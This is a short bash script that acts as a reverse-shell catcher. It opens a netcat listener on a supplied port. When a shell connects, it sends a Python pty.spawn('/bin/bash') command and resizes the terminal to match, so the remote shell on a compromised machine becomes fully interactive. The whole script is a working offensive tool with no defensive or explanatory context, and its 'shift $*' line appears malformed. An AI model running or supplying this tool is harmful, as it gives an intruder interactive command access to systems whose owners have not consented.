#!/bin/bash

ttyinfo=$(stty -a | head -n 1)
rows=$(<<<$ttyinfo cut -d ';' -f 2 | perl -nle 'm/(\d+)/; print $1')
cols=$(<<<$ttyinfo cut -d ';' -f 3 | perl -nle 'm/(\d+)/; print $1')


stty raw -echo

shift $*
(echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'"; echo "stty rows $rows columns $cols"; cat) | nc -nvlp $*
reset

